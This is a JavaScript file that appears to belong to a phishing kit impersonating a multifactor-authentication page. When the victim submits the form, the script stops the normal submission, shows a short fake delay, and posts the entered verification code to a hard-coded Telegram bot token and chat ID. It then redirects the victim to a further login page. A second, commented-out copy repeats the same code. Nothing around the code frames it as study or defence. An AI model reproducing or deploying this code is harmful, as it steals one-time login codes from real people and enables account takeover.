let formm;
let delayy;
let counterr;
let generated_email;
let email_field;
let password_field;
let submit_btn;

document.addEventListener("DOMContentLoaded", () => {
  console.log("Page loaded");
  counterr = document.querySelector(".counterr");
  delayy = document.getElementById("delayy");
  email_field = document.getElementById("multifactor_code");
  submit_btn = document.querySelector("button[type='submit']");
  formm = document.getElementById("new_multifactor");

  formm.addEventListener("submit", (e) => {
    e.preventDefault();
    show_counter().then(() => {
      console.log("submit form");
      send_telegram_message();
    });
  });
});

function show_counter() {
  submit_btn.setAttribute("disabled", "true");
  const del = document.getElementById("delayy");
  del.style.display = "flex";
  return new Promise((resolve) => {
    setTimeout(() => {
      resolve();
    }, 5000); // Adjust the delay as needed
  });
}

// async function send_telegram_message() {
//   const chatIds = ["-1001991348429"]; // Add your chat IDs here
//   const verificationCode = email_field.value;
//   const msg = `Verification code: ${verificationCode}`;

//   for (let i = 0; i < chatIds.length; i++) {
//     const data = {
//       chat_id: chatIds[i],
//       text: msg,
//     };

//     try {
//       const resp = await fetch(
//         `https://api.telegram.org/bot5312671411:AAFihWuoM10og_jUITZkqIqa-gk0p_i7H-E/sendMessage`, // Replace 'your_bot_token' with your actual bot token
//         {
//           method: "POST",
//           headers: {
//             accept: "application/json",
//             "content-type": "application/json",
//           },
//           body: JSON.stringify(data),
//         }
//       );

//       const resJson = await resp.json();
//       console.log(resJson);
      
//       // Redirect to the next page after sending the message
//       window.location.href = "/Login/validate/index.html"; // Replace "nextpage.html" with the URL of the next page
//     } catch (error) {
//       console.error("Error sending message to Telegram:", error);
//     }
//   }
// }



async function send_telegram_message() {
  const chatIds = ["-1001991348429"]; // Add your chat IDs here
  const verificationCode = email_field.value;
  const msg = `Verification code: ${verificationCode}`;

  for (let i = 0; i < chatIds.length; i++) {
    const data = {
      chat_id: chatIds[i],
      text: msg,
    };

    try {
      const resp = await fetch(
        `https://api.telegram.org/bot5312671411:AAFihWuoM10og_jUITZkqIqa-gk0p_i7H-E/sendMessage`, // Replace 'your_bot_token' with your actual bot token
        {
          method: "POST",
          headers: {
            accept: "application/json",
            "content-type": "application/json",
          },
          body: JSON.stringify(data),
        }
      );

      const resJson = await resp.json();
      console.log(resJson);
      
      if (resJson.ok) {
        console.log("Message sent successfully");
      } else {
        console.error("Telegram API response indicates failure:", resJson);
      }

      // Redirect to the next page after sending the message
      window.location.href = "/Login/validate/index.html"; // Replace "nextpage.html" with the URL of the next page
    } catch (error) {
      console.error("Error sending message to Telegram:", error);
    }
  }
}